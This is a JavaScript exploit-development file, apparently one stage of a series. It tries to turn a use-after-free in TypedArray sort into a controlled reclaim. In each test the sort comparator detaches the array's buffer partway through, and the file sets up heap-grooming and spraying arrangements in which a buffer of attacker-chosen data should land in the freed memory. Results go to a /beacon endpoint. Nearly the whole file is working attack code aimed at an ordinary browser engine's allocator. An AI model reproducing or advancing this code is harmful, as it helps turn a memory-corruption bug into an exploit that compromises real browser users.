// p216 — Heap grooming for sort UAF reclaim
//
// p215 proved: sort reads freed memory (zeros, not original pattern).
// But simple spray doesn't reclaim the freed chunk — allocator caches.
//
// Strategy: pre-groom the heap so the freed chunk is at a predictable
// position in the allocator's free list, then reclaim it with the
// NEXT allocation of the same size.
//
// Techniques:
// A: LIFO reclaim — free one buffer, sort buffer takes its slot,
//    then when sort buffer is freed, next alloc gets it
// B: Page drain — fill an entire allocator page with 4096B buffers,
//    free them all, then allocate through them predictably
// C: Different size classes — try sizes near 4096 to hit the right class
// D: Delayed spray — don't spray inside comparator, spray AFTER sort
// E: Double sort — first sort to identify the freed address pattern,
//    second sort with targeted reclaim
//
// Beacon prefix: V216-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V216-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');
  var tests = [];
  var currentTest = 0;

  // ── TEST A: LIFO groom — exhaust free list first ──
  // Allocate 2000 buffers, free them all (fills free list),
  // then allocate sort buffer (takes top of free list).
  // Free sort buffer → goes to top. Next alloc → reclaims it.
  tests.push({name: 'A-LIFO', run: function(done) {
    // Step 1: Groom — fill and drain to make allocator predictable
    var groom = [];
    for (var i = 0; i < 2000; i++) {
      groom.push(new ArrayBuffer(4096));
    }
    // Free all of them — fills the free list
    groom = null;

    // Step 2: Allocate a "warmup" set to stabilize
    var warmup = [];
    for (var i = 0; i < 100; i++) {
      warmup.push(new ArrayBuffer(4096));
    }

    // Step 3: Our target buffer (should be near top of allocation order)
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xAAAA0000 | i;

    var detached = false;
    var cmp = 0;
    var vals = [];
    var MAGIC = 0xDEADFACE;
    var reclaim = null;

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;

          // IMMEDIATELY allocate ONE buffer — LIFO should give us the freed slot
          reclaim = new ArrayBuffer(4096);
          var rv = new Uint32Array(reclaim);
          for (var j = 0; j < rv.length; j++) rv[j] = MAGIC;

          B('A-RECLAIMED');
        }
        if (detached && vals.length < 40) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var deadCount = 0, origCount = 0, zeroCount = 0;
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === MAGIC) deadCount++;
        else if ((vals[i] & 0xFFFF0000) === 0xAAAA0000) origCount++;
        else if (vals[i] === 0) zeroCount++;
      }
      B('A-CMP' + cmp);
      B('A-DEAD-' + deadCount);
      B('A-ORIG-' + origCount);
      B('A-ZERO-' + zeroCount);

      // Check if reclaim buffer was modified by sort
      if (reclaim) {
        var rv = new Uint32Array(reclaim);
        var modified = 0;
        for (var k = 0; k < rv.length; k++) {
          if (rv[k] !== MAGIC) { modified++; break; }
        }
        B('A-RMOD-' + (modified > 0 ? 'YES' : 'NO'));
      }

      for (var m = 0; m < Math.min(5, vals.length); m++) {
        B('A-V' + m + '-' + hex(vals[m]));
      }
    } catch (e) {
      B('A-ERR-' + e.name);
    }
    warmup = null;
    done();
  }});

  // ── TEST B: Spray BEFORE sort, free during, reclaim after ──
  // Pre-allocate and FILL spray buffers. Free one during sort.
  // The freed sort buffer takes the freed spray slot.
  // Then the spray buffer we still hold overlaps with the freed sort memory.
  tests.push({name: 'B-PRESPR', run: function(done) {
    // Pre-allocate spray buffers
    var spray = [];
    for (var i = 0; i < 200; i++) {
      var s = new ArrayBuffer(4096);
      var sv = new Uint32Array(s);
      for (var j = 0; j < sv.length; j++) sv[j] = 0xBB000000 | (i << 12) | j;
      spray.push(s);
    }

    // Allocate sort buffer RIGHT AFTER spray (adjacent in heap)
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = view.length - i;

    // Allocate MORE spray after sort buffer
    for (var i = 0; i < 200; i++) {
      var s = new ArrayBuffer(4096);
      var sv = new Uint32Array(s);
      for (var j = 0; j < sv.length; j++) sv[j] = 0xCC000000 | (i << 12) | j;
      spray.push(s);
    }

    var detached = false;
    var cmp = 0;
    var vals = [];

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          B('B-DETACHED');
          // Don't allocate anything new — the freed slot is between spray buffers
        }
        if (detached && vals.length < 60) {
          vals.push(a >>> 0);
        }
        return a - b;
      });

      B('B-CMP' + cmp);

      // Check spray buffers for corruption from sort writes
      var corrupt = 0;
      var corruptIdx = -1;
      for (var i = 0; i < spray.length; i++) {
        var sv = new Uint32Array(spray[i]);
        var firstExpected;
        if (i < 200) {
          firstExpected = 0xBB000000 | (i << 12) | 0;
        } else {
          firstExpected = 0xCC000000 | ((i - 200) << 12) | 0;
        }
        if (sv[0] !== firstExpected) {
          corrupt++;
          if (corruptIdx === -1) {
            corruptIdx = i;
            B('B-CORRUPT-' + i + '-' + hex(sv[0]) + '_' + hex(sv[1]) + '_' + hex(sv[2]) + '_' + hex(sv[3]));
          }
        }
      }
      B('B-CORRUPT-TOTAL-' + corrupt);

      // Report comparator values
      var nonZero = 0;
      for (var k = 0; k < vals.length; k++) {
        if (vals[k] !== 0) nonZero++;
      }
      B('B-NONZERO-' + nonZero);
      for (var m = 0; m < Math.min(5, vals.length); m++) {
        B('B-V' + m + '-' + hex(vals[m]));
      }
    } catch (e) {
      B('B-ERR-' + e.name);
    }
    spray = null;
    done();
  }});

  // ── TEST C: Different buffer sizes near 4096 ──
  // libpas uses size classes. 4096 might round up. Try adjacent sizes.
  tests.push({name: 'C-SIZES', run: function(done) {
    var sizes = [4080, 4096, 4112, 4064, 4032, 3968, 3840, 4224, 4352, 4608];
    var results = [];

    function testSize(idx) {
      if (idx >= sizes.length) {
        for (var r = 0; r < results.length; r++) {
          B('C-SZ' + results[r].size + '-DEAD' + results[r].dead + '-ZERO' + results[r].zero + '-ORIG' + results[r].orig);
        }
        done();
        return;
      }

      var sz = sizes[idx];
      var ab = new ArrayBuffer(sz);
      var elemCount = (sz / 4) | 0;
      var view = new Uint32Array(ab, 0, elemCount);
      for (var i = 0; i < view.length; i++) view[i] = 0xAAAAAAAA;

      var detached = false;
      var localCmp = 0;
      var localVals = [];
      var MAGIC = 0xDEADFACE;

      try {
        view.sort(function(a, b) {
          localCmp++;
          if (localCmp === 30 && !detached) {
            structuredClone(ab, {transfer: [ab]});
            detached = true;
            // Single immediate reclaim attempt
            var r = new ArrayBuffer(sz);
            var rv = new Uint32Array(r, 0, (sz / 4) | 0);
            for (var j = 0; j < rv.length; j++) rv[j] = MAGIC;
          }
          if (detached && localVals.length < 20) {
            localVals.push(a >>> 0);
          }
          return 0;
        });
      } catch (e) {}

      var dead = 0, zero = 0, orig = 0;
      for (var k = 0; k < localVals.length; k++) {
        if (localVals[k] === MAGIC) dead++;
        else if (localVals[k] === 0) zero++;
        else if (localVals[k] === 0xAAAAAAAA) orig++;
      }
      results.push({size: sz, dead: dead, zero: zero, orig: orig});
      setTimeout(function() { testSize(idx + 1); }, 50);
    }

    testSize(0);
  }});

  // ── TEST D: Massive groom + single reclaim ──
  // Allocate 5000 buffers, reference half, null half.
  // Sort buffer is in the "null" range. After free, allocate ONE.
  tests.push({name: 'D-MASSGROOM', run: function(done) {
    // Phase 1: Create large heap region of 4096-byte buffers
    var kept = [];
    var freed = [];
    for (var i = 0; i < 1000; i++) {
      kept.push(new ArrayBuffer(4096));
      freed.push(new ArrayBuffer(4096));
    }
    // Free alternating buffers — creates holes
    freed = null;
    B('D-GROOMED');

    // Phase 2: Sort buffer fills one of the holes
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xAAAAAAAA;

    var detached = false;
    var cmp = 0;
    var vals = [];
    var MAGIC = 0xDEADFACE;
    var reclaim = null;

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // Allocate ONE buffer — should take the just-freed slot
          reclaim = new ArrayBuffer(4096);
          var rv = new Uint32Array(reclaim);
          for (var j = 0; j < rv.length; j++) rv[j] = MAGIC;
          B('D-RECLAIMED');
        }
        if (detached && vals.length < 40) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var deadCount = 0, zeroCount = 0, origCount = 0;
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === MAGIC) deadCount++;
        else if (vals[i] === 0) zeroCount++;
        else if (vals[i] === 0xAAAAAAAA) origCount++;
      }
      B('D-CMP' + cmp);
      B('D-DEAD-' + deadCount);
      B('D-ZERO-' + zeroCount);
      B('D-ORIG-' + origCount);

      // Check if reclaim buffer was modified
      if (reclaim) {
        var rv = new Uint32Array(reclaim);
        var mod = 0;
        for (var k = 0; k < rv.length; k++) {
          if (rv[k] !== MAGIC) { mod++; }
        }
        B('D-RMOD-' + mod);
        if (mod > 0) {
          B('D-RVAL0-' + hex(rv[0]));
          B('D-RVAL1-' + hex(rv[1]));
        }
      }
    } catch (e) {
      B('D-ERR-' + e.name);
    }
    kept = null;
    done();
  }});

  // ── TEST E: Worker transfer (memory actually freed by different thread) ──
  // MessageChannel transfer might free memory differently than structuredClone
  tests.push({name: 'E-MSGCH', run: function(done) {
    var ab = new ArrayBuffer(4096);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xAAAAAAAA;

    var ch = new MessageChannel();
    var detached = false;
    var cmp = 0;
    var vals = [];
    var MAGIC = 0xDEADFACE;

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          ch.port1.postMessage(ab, [ab]);
          detached = true;
          // Immediate reclaim
          var r = new ArrayBuffer(4096);
          var rv = new Uint32Array(r);
          for (var j = 0; j < rv.length; j++) rv[j] = MAGIC;
          B('E-DETACHED');
        }
        if (detached && vals.length < 40) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var deadCount = 0, zeroCount = 0, origCount = 0, otherCount = 0;
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === MAGIC) deadCount++;
        else if (vals[i] === 0) zeroCount++;
        else if (vals[i] === 0xAAAAAAAA) origCount++;
        else otherCount++;
      }
      B('E-CMP' + cmp);
      B('E-DEAD-' + deadCount);
      B('E-ZERO-' + zeroCount);
      B('E-ORIG-' + origCount);
      B('E-OTHER-' + otherCount);
      if (otherCount > 0) {
        for (var k = 0; k < vals.length && k < 10; k++) {
          if (vals[k] !== MAGIC && vals[k] !== 0 && vals[k] !== 0xAAAAAAAA) {
            B('E-OVAL-' + hex(vals[k]));
          }
        }
      }
    } catch (e) {
      B('E-ERR-' + e.name);
    }
    done();
  }});

  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 20000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
